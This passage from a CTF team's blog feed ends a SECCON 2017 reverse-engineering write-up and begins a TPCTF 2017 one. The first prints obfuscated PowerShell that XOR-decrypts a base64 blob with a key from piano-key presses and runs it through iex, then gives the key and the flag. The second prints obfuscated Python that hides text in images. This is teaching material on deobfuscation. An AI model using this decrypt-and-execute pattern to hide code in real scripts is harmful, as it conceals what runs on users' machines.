class="variable">$k</span>=<span class="variable">$keytone</span>[<span class="variable">$pk</span>]*[math]::pow(<span class="number">2</span>,<span class="number">1</span>/<span class="number">12</span>)&#125;;<span class="variable">$pk</span>=<span class="variable">$k</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> <span class="string">"Play the secret melody."</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' w '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' e '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' t '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' y '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' u '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'    '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  a |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  s |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  d |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  f |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  g |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  h |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  j |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'  k '</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></span><br><span class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'    '</span></span><br><span class="line"><span class="built_in">Write-Host</span></span><br><span class="line"><span class="variable">$stage1</span>=@();<span class="variable">$f</span>=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">While</span>(<span class="variable">$stage1</span>.length <span class="nomarkup">-lt</span> <span class="number">14</span>)&#123;</span><br><span class="line"><span class="variable">$key</span>=(<span class="built_in">Get-Host</span>).ui.RawUI.ReadKey(<span class="string">"NoEcho,IncludeKeyDown"</span>)</span><br><span class="line"><span class="variable">$k</span>=[String]<span class="variable">$key</span>.Character</span><br><span class="line"><span class="variable">$f</span>+=<span class="variable">$k</span>;</span><br><span class="line"><span class="keyword">If</span>(<span class="variable">$keytone</span>.Contains(<span class="variable">$k</span>))&#123;</span><br><span class="line"><span class="variable">$stage1</span>+=[math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])</span><br><span class="line">[console]::beep(<span class="variable">$keytone</span>[<span class="variable">$k</span>],<span class="number">500</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$secret</span>=@(<span class="number">440</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">523</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">349</span>)</span><br><span class="line"><span class="keyword">If</span>(<span class="variable">$secret</span>.length <span class="nomarkup">-eq</span> <span class="variable">$stage1</span>.length)&#123;</span><br><span class="line"><span class="keyword">For</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="nomarkup">-le</span> <span class="variable">$secret</span>.length; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="keyword">If</span>(<span class="variable">$secret</span>[<span class="variable">$i</span>] <span class="nomarkup">-ne</span> <span class="variable">$stage1</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line"><span class="keyword">Exit</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">x <span class="string">"Correct. Move to the next stage."</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$text</span>=<span class="string">@"</span></span><br><span class="line"><span class="string">YkwRUxVXQ05DQ1NOE1sVVU4TUxdTThBBFVdDTUwTURVTThMqFldDQUwdUxVRTBNEFVdAQUwRUxtT</span></span><br><span class="line"><span class="string">TBEzFVdDQU8RUxdTbEwTNxVVQUNOEFEVUUwdQBVXQ0NOE1EWUUwRQRtVQ0FME1EVUU8RThdVTUNM</span></span><br><span class="line"><span class="string">EVMVUUwRFxdVQUNCE1MXU2JOE0gWV0oxSk1KTEIoExdBSDBOE0MVO0NKTkAoERVDSTFKThNNFUwR</span></span><br><span class="line"><span class="string">FBVINUFJTkAqExtBSjFKTBEoF08RVRdKO0NKTldKMUwRQBc1QUo7SlNgTBNRFVdJSEZCSkJAKBEV</span></span><br><span class="line"><span class="string">QUgzSE8RQxdMHTMVSDVDSExCKxEVQ0o9SkwRQxVOE0IWSDVBSkJAKBEVQUgzThBXFTdDRExAKhMV</span></span><br><span class="line"><span class="string">Q0oxTxEzFzVNSkxVSjNOE0EWN0NITE4oExdBSjFMEUUXNUNTbEwTURVVSExCKxEVQ0o9SkwRQxVO</span></span><br><span class="line"><span class="string">EzEWSDVBSkJAKBEVQUgzThAxFTdDREwTURVKMUpOECoVThNPFUo3U0pOE0gWThNEFUITQBdDTBFK</span></span><br><span class="line"><span class="string">F08RQBdMHRQVQUwTSBVOEEIVThNPFUNOE0oXTBFDF0wRQRtDTBFKFU4TQxZOExYVTUwTSBVMEUEX</span></span><br><span class="line"><span class="string">TxFOF0NCE0oXTBNCFU4QQRVBTB1KFU4TThdMESsXQ04TRBVMEUMVThNXFk4TQRVNTBNIFUwRFBdP</span></span><br><span class="line"><span class="string">EUEXQ0ITShdME0EVThBXFU4TWxVDThNKF0wRMBdMETUbQ0wRShVOE0MWThMqFU1ME0gVTBFDF08R</span></span><br><span class="line"><span class="string">QxdMHUMVQUwTSBVOEEEVThNNFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNGF0wTKhVBTxFK</span></span><br><span class="line"><span class="string">F0wdMxVOEzUXQ04QSBVOE0AVTBFVFUFMEUkXTBFDG0wTQRVMETMXQE4TSBVCE0MXTBNBFU4QQRVB</span></span><br><span class="line"><span class="string">TB1KFU4TQxdMEVYXTBEUG0NMEUoVThNBFk4TQRVCEygXQ0wRShdPEUMXTB1DFU4TQBdDThBIFU4T</span></span><br><span class="line"><span class="string">SBVMESgVQUwRSRdMEUYbTBMWFUNOE0gWThNCFUITFBdDTBFKF08RQxdMHUMVThNVF0NOEEgVThNN</span></span><br><span class="line"><span class="string">FUwRQxVOE0IWQUwRShtME0EVTBFVF08RQxdDQhNKF0wTQRVOEEEVThM9FUNOE0oXTBFFF0wRKBtD</span></span><br><span class="line"><span class="string">TBFKFU4TQRZOE0EVQhNAF0NMEUoXTxFDF0wdVRVOEzMXQ04QSBVOE00VTBFVFU4TQRZBTBFKG0wT</span></span><br><span class="line"><span class="string">RBVMESgXQE4TSBVCE0MXTBNBFU4QKhVBTB1KFU4TFBdMEUIXQ04TRBVMEUMVThNBFk4TNxVNTBNI</span></span><br><span class="line"><span class="string">FUwRQxdPEUMXTB01FUFME0gVThBBFU4TTRVMERQVQUwRSRdMEUMbTBNBFUwRQxdAThNIFUITQxdM</span></span><br><span class="line"><span class="string">E0EVThAxFUFMHUoVThNDF0wRVhdMEVUbQ0wRShVOE0QWThMWFU1ME0gVTBFDF08RRhdDQhNKF0wT</span></span><br><span class="line"><span class="string">QRVOEFcVQUwdShVOE0EXTBFFF0NOE0QVTBFDFU4TVxZOEyoVTUwTSBVMETMXTxFVF0NCE0oXTBNE</span></span><br><span class="line"><span class="string">FU4QQhVBTB1KFU4TQBdMERcXQ04TRBVMEUAVThNDFkFMEUobTBNCFUwRQRdAThNIFUITQRdMExYV</span></span><br><span class="line"><span class="string">QU8RShdMHUEVThNOF0NOEEgVThNIFUwRKBVBTBFJF0wRMxtMEzcVQ04TSBZOE0EVQhNVF0wTQRVB</span></span><br><span class="line"><span class="string">TxFKF0wdQxVOE0MXTBFFF0NOE0QVTBFGFU4TKhZBTBFKG0wTRBVMERQXQE4TSBVCE04XTBNXFUFP</span></span><br><span class="line"><span class="string">EUoXTB0zFU4TThdDThBIFU4TTRVMEUMVThMWFkFMEUobTBNCFUwRFBdAThNIFUITQxdME0EVThAx</span></span><br><span class="line"><span class="string">FUFMHUoVThNGF0wRQxdDThNEFUwRQRVOEyoWQUwRShtMEzcVTBFDF0BOE0gVQhMzF0wTFhVBTxFK</span></span><br><span class="line"><span class="string">F0wdMxVOExQXQ04QSBVOE0gVTBEUFUFMEUkXTBEzG0wTQRVDThNIFk4TQRVCEygXTBNEFUFPEUoX</span></span><br><span class="line"><span class="string">TB1DFU4TRhdDThBIFU4TTRVMEVUVQUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdM</span></span><br><span class="line"><span class="string">HTMVQUwTSBVOEEEVThNbFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwd</span></span><br><span class="line"><span class="string">ShVOEzMXTBE2F0NOE0QVTBFBFU4TKhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsV</span></span><br><span class="line"><span class="string">Q04TShdMEUAXTBFDG0wTQhVDThNIFk4TRBVCEygXQ0wRShdPEUYXTB0UFUFME0gVThBDFU4TTRVD</span></span><br><span class="line"><span class="string">ThNKF0wRQBdMEUMbTBNBFUNOE0gWThNBFUITQxdME0EVQU8RShdMHUMVThNVF0wRVhdDThNEFUwR</span></span><br><span class="line"><span class="string">RhVOEyoWQUwRShtME0MVTBEzF0BOE0gVQhNDF0wTQRVOEEEVQUwdShVOExQXTBFNF0NOE0QVTBFG</span></span><br><span class="line"><span class="string">FU4TRBZBTBFKG0wTRBVMERQXQE4TSBVCEzUXTBMWFUFPEUoXTB1DFU4TRhdDThBIFU4TTRVMEVUV</span></span><br><span class="line"><span class="string">QUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdMHTMVQUwTSBVOEEEVThNbFUwRNRVB</span></span><br><span class="line"><span class="string">TBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwdShVOEzMXTBE2F0NOE0QVTBFBFU4T</span></span><br><span class="line"><span class="string">KhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsVQ04TShdMEUAXTBFDG0wTQhVDThNI</span></span><br><span class="line"><span class="string">Fk4TRBVCEygXQ0wRShdPEUYXTB0zFUFME0gVThBMFU4TSBVDThNKF0wRQxdMERQbQ0wRShVOE0IW</span></span><br><span class="line"><span class="string">ThNDFU1ME0gVTBFAF08RQRdDQhNKF0wTQxVOEBYVQUwdShVOE0EXTBFNF0NOE0QVTBFDFU4TKhZO</span></span><br><span class="line"><span class="string">E0QVTUwTSBVMEUYXTxFAF0NCE0oXTBNCFU4QFhVBTB1KFU4TQBdMEUIXQ04TRBVMEUAVThNDFkFM</span></span><br><span class="line"><span class="string">EUobTBNDFUwRFBdAThNIFUITQRdME0wVQU8RShdMHUMVThMoF0wRNhdDThNEFUwRRhVOEzEWQUwR</span></span><br><span class="line"><span class="string">ShtME0EVTBFGF0BOE0gVQhNDF0wTVxVBTxFKF0wdQxVOEygXTBE2FxROE10VShZOTBFTF2E=</span></span><br><span class="line"><span class="string">"@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$plain</span>=@()</span><br><span class="line"><span class="variable">$byteString</span> = [System.Convert]::FromBase64String(<span class="variable">$text</span>)</span><br><span class="line"><span class="variable">$xordData</span> = $(<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$byteString</span>.length; ) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> <span class="nomarkup">-lt</span> <span class="variable">$f</span>.length; <span class="variable">$j</span>++) &#123;</span><br><span class="line"><span class="variable">$plain</span>+=<span class="variable">$byteString</span>[<span class="variable">$i</span>] -bxor <span class="variable">$f</span>[<span class="variable">$j</span>]</span><br><span class="line"><span class="variable">$i</span>++</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$i</span> <span class="nomarkup">-ge</span> <span class="variable">$byteString</span>.Length) &#123;</span><br><span class="line"><span class="variable">$j</span> = <span class="variable">$f</span>.length</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</span><br></pre></td></tr></table></figure><p>I removed some of the beginning of the script, it was useless code and was just printing some things to the screen, continuing with the rest we have more two steps to conclude, the first one was to play the piano accordantly to the key in the code <code>440,440,493,440,440,493,440,493,523,493,440,493,440,349</code>.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">While</span>(<span class="variable">$stage1</span>.length <span class="nomarkup">-lt</span> <span class="number">14</span>)&#123;</span><br><span class="line"><span class="variable">$key</span>=(<span class="built_in">Get-Host</span>).ui.RawUI.ReadKey(<span class="string">"NoEcho,IncludeKeyDown"</span>)</span><br><span class="line"><span class="variable">$k</span>=[String]<span class="variable">$key</span>.Character</span><br><span class="line"><span class="variable">$f</span>+=<span class="variable">$k</span>;</span><br><span class="line"><span class="keyword">If</span>(<span class="variable">$keytone</span>.Contains(<span class="variable">$k</span>))&#123;</span><br><span class="line"><span class="variable">$stage1</span>+=[math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])</span><br><span class="line"><span class="built_in">Write-Host</span> ([math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])).toString(),<span class="variable">$k</span></span><br><span class="line">[console]::beep(<span class="variable">$keytone</span>[<span class="variable">$k</span>],<span class="number">500</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Each key of the piano corresponds to a number this is easy to discover without having to even look at the code, I just added a few prints in the loop and go through the executable and enter the correct key for the piano was <strong>hhjhhjhjkjhjhf</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/fXDeOab.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/fXDeOab.png" alt=""><br></a><br>The last phase is to decrypt that big base64 string with the key we got from the piano, once again we don’t even need to check the code just print the variable and you will get the last powershell script of the challenge.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$plain</span>=@()</span><br><span class="line"><span class="variable">$byteString</span> = [System.Convert]::FromBase64String(<span class="variable">$text</span>)</span><br><span class="line"><span class="variable">$xordData</span> = $(<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$byteString</span>.length; ) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> <span class="nomarkup">-lt</span> <span class="variable">$f</span>.length; <span class="variable">$j</span>++) &#123;</span><br><span class="line"><span class="variable">$plain</span>+=<span class="variable">$byteString</span>[<span class="variable">$i</span>] -bxor <span class="variable">$f</span>[<span class="variable">$j</span>]</span><br><span class="line"><span class="variable">$i</span>++</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$i</span> <span class="nomarkup">-ge</span> <span class="variable">$byteString</span>.Length) &#123;</span><br><span class="line"><span class="variable">$j</span> = <span class="variable">$f</span>.length</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</span><br><span class="line"><span class="built_in">Write-Host</span> iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</span><br><span class="line"><span class="built_in">Read-Host</span> -Prompt <span class="string">"Press Enter to exit"</span></span><br></pre></td></tr></table></figure><p>Now we get another powershell script but the obfuscation on this one is real asking for a password:<br><a data-fancybox="gallery" href="https://i.imgur.com/AE3YVuy.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/AE3YVuy.png" alt=""><br></a><br>Well it wasn’t very hard to me to reverse it, if you look closely there are alot of semicolons separating each variable assignment, for instance I checked one bye one variable and the one who looked interesting was the variable <code>{;}</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\root&gt; $&#123;;&#125;</span><br><span class="line">iex</span><br></pre></td></tr></table></figure><p><strong>iex</strong> is an invocation, for example it can be used to run a .ps1 file, if we look closely at the end of the script we can see a very big string (in green) which is being piped into <strong>iex</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/gsm6dOQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/gsm6dOQ.png" alt=""><br></a><br>if we copy that big string into the terminal we can see alot of <em>[char]number</em>, to easily convert them into text we can assign it into a variable and then call it and get the password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xJMeKxF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xJMeKxF.png" alt=""><br></a><br>As we can see the flag was the password! SECCON{P0wEr$H311}</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Powerful_Shell&lt;br&gt;300 points&lt;br&gt;Powerful_Shell&lt;br&gt;&lt;br&gt;Crack me.&lt;br&gt;powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfc
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="seccon2017" scheme="https://teamrocketist.github.io/tags/seccon2017/"/>
    
      <category term="powershell" scheme="https://teamrocketist.github.io/tags/powershell/"/>
    
      <category term="obfuscation" scheme="https://teamrocketist.github.io/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] TPCTF2017 - Bad Encryption</title>
    <link href="https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/"/>
    <id>https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/</id>
    <published>2017-12-04T06:06:23.000Z</published>
    <updated>2018-10-24T23:21:04.862Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Bad Encryption<br>100<br><br>I was making an encryption program, but it is far from perfect. Instead of make the encryption work, I decided to just encrypt everything 100 times.<br><br>Author: Kevin Higgs<br><br></blockquote><p>We have a python program, which is little bit obfuscated with this horrible named variables:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    tel1l1l1l1l1l1l1lt = <span class="string">"REDACTED"</span></span><br><span class="line">    <span class="keyword">import</span> builtins, random</span><br><span class="line">    l1l1l1l1l1l1l1l = getattr(builtins, <span class="string">"__import__"</span>)</span><br><span class="line">    l1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l(<span class="string">"PIL.Image"</span>)</span><br><span class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l.Image</span><br><span class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.new(<span class="string">"RGB"</span>, (len(tel1l1l1l1l1l1l1lt), <span class="number">1</span>), <span class="string">"white"</span>)</span><br><span class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.load()</span><br><span class="line">    l1l1l1l1l1l1l1ll1l1l1l111l1l11 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 <span class="keyword">in</span> tel1l1l1l1l1l1l1lt:</span><br><span class="line">        l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 = ord(l1l1l1l1l1l1l1ll1l1l1l1l1l1l11)</span><br><span class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l111 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</span><br><span class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l112 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</span><br><span class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l113 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</span><br><span class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l111 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111/<span class="number">256</span>)</span><br><span class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l112 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l112/<span class="number">256</span>)</span><br><span class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l113 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l113/<span class="number">256</span>)</span><br><span class="line">        l1l121l1l1l1l11ll1l1l1l1lll1l111 = l1l1l1l1l1l1l1ll1l1l1l1l1l1l11*l1l1l1l1l1l1l11ll1l1l1l1lll1l111</span><br><span class="line">        l1l121l1l1l1l11ll1l1l1l1lll1l112 = l1l121l1l1l1l11ll1l1l1l1lll1l111*l1l1l1l1l1l1l11ll1l1l1l1lll1l112</span><br><span class="line">        l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l[l1l1l1l1l1l1l1ll1l1l1l111l1l11,<span class="number">0</span>] = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111, l1l1l1l1l1l1l1ll1l1l1l1lll1l112, round(l1l121l1l1l1l11ll1l1l1l1lll1l112*<span class="number">10</span>))</span><br><span class="line">        l1l1l1l1l1l1l1ll1l1l1l111l1l11 += <span class="number">1</span></span><br><span class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.save(<span class="string">"out"</span>+str(i)+<span class="string">".png"</span>)</span><br></pre></td></tr></table></figure><p>After fixing the code to be more readable I got this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> 